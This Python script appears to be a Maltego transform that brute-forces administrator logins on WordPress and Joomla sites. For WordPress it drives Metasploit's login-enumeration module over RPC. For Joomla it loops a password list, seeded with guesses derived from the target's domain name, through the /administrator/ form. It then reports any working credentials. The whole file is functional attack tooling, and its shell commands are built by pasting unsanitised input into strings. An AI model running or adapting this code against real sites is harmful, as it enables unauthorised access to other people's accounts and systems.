from TeethLib import *
from MaltegoTransform import *
import socket
from METASPLOIT import *
from BeautifulSoup import BeautifulSoup
from sTLD import *

#########
def trx_BruteWP(m,ib):
 
 target=m.getVar('entry')
 logger.info("Running Metasploit WP brute module on [%s]"%target)
 
 threads=read_config_file("WordPressBrute","Threads")
 user=read_config_file("WordPressBrute","Username")
 passwordfile_main=read_config_file("WordPressBrute","Passwordsfile")
 passwordfile="/tmp/"+id_generator()
 run_external("echo %s >> %s"%(ib,passwordfile))
 run_external("echo %sadmin >> %s"%(ib,passwordfile))
 run_external("echo %spassword >> %s"%(ib,passwordfile))
 run_external("echo %s123 >> %s"%(ib,passwordfile))
 run_external("cat %s >> %s"%(passwordfile_main,passwordfile))
 logger.debug("IB is [%s] - Temp password file is [%s]"%(ib,passwordfile))
 
 MShost=read_config_file('Metasploit','Host')
 MSport=read_config_file('Metasploit','Port')
 MSuser=read_config_file('Metasploit','User')
 MSpassword=read_config_file('Metasploit','Password')
 
 cmd='''
use auxiliary/scanner/http/wordpress_login_enum
set RHOSTS %s
set VHOST %s
set USERNAME %s
set ENUMERATE_USERNAMES false
set STOP_ON_SUCCESS true
set THREADS %s
set PASS_FILE %s
set VERBOSE false
exploit
''' % (target,target,user,threads,passwordfile)
 logger.debug("Waiting for Metasploit WP brute module on [%s]"%target)
 response=RunMSF(cmd,MShost,MSport,MSuser,MSpassword) 
 logger.debug("Metasploit WP brute module finished on [%s]. Output is:\n[%s]"%(target,response))

 run_external("rm %s"%passwordfile) 
 if response.find('SUCCESSFUL login for')>0:
  credsline=response[response.find("'"):1+response.rfind("'")]
  logger.warn("Found WP credentials on [%s] - [%s]"%(target,credsline))
  Ent=m.addEntity('maltego.Phrase',"")
  #Ent.setBookmark(BOOKMARK_COLOR_RED) 
  Ent.setValue(m.getVar('entry')+" : "+credsline)
  m.returnOutput()
 
 else:
  logger.info("Could not find WP credentials for: %s"%target)



########
def trx_BruteJoomla(m,ib):
 target=m.getVar('entry')

 # Browser
 br = mechanize.Browser()
 cj = cookielib.LWPCookieJar()
 br.set_cookiejar(cj)
 br.set_handle_equiv(True)
 br.set_handle_redirect(True)
 br.set_handle_referer(True)
 br.set_handle_robots(False)
 
 # Follows refresh 0 but not hangs on refresh > 0
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 
 br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

 passwords=[line.strip() for line in open(read_config_file('JoomlaBrute','PasswordsFile'))]
 logger.debug("IB is [%s] - adding to password list"%ib)
 passwords.append(ib)
 passwords.append(ib+"123")
 passwords.append(ib+"admin")
 passwords.append(ib+"password")
 
 
 logger.info("Starting Joomla brute on [%s]"%target)
 username=read_config_file('JoomlaBrute','username')
 
 for passw in passwords:
  logger.debug("Testing with username [%s] and password [%s]"%(username,passw))
  html=""
  
  try:
   r = br.open('http://'+target+'/administrator/')
   html = r.read()
  except:
   logger.info(target+": could not connect to the! Joomla! Interface!")
   return m
   
  if (html.find('Joomla') < 0):
   logger.info(target+": does not look like a! Joomla! Interface!")
   return m
  
  br.select_form(nr=0)
  
  try:
   br.form['passwd']=passw
  except:
   br.form['pass']=passw
      
  try:
   br.form['username']=username
  except:
   br.form['usrname']=username
            
  html=""
  try:
   br.submit()
   html=br.response().read()
  except:
   logger.info(target+": could not submit form to the! Joomla! Interface!")
   return m
         
    
  if (html.find('Components')>0):
   credsline="'admin' : '"+passw+"'";
   logger.warn("Found credentials for [%s] - [%s]"%(target,credsline))  
   Ent=m.addEntity('maltego.Phrase','')
   Ent.setValue(m.getVar('entry')+" : "+credsline)
   br.close()
   return m
    
 logger.info("Done. Could not find Joomla credentials for:"+target)
 return m                                                                                                         






##########MAIN
m = MaltegoTransform()
m.parseArguments(sys.argv);
target=sys.argv[1]

if m.getVar('type') is None or m.getVar('entry') is None:
 logger.info("You need a entry point (entry) and a type (type) - you have one or both missing")
 m.returnOutput()
 quit()
 
# load tlds, ignore comments and empty lines:
with open("effective_tld_names.dat.txt") as tldFile:
    tlds = [line.strip() for line in tldFile if line[0] not in "/\n"]
    
domain_parts = get_domain_parts("http://"+m.getVar('entry'),tlds)
interestingbit=domain_parts.domain
logger.debug("Adding [%s] to the password list"%interestingbit)

if (interestingbit is None):
 logger.info("Could not parse domain. This is not great, but we'll continue..")
 
if m.getVar('type') == 'WP':
  trx_BruteWP(m,interestingbit)
 
elif m.getVar('type') == 'JML':
  trx_BruteJoomla(m,interestingbit)
 
else:
 logging.info("Unknown type [%s] on [%s] - exiting.."%(m.getVar('type'),target))
 
 
m.returnOutput()



    
    
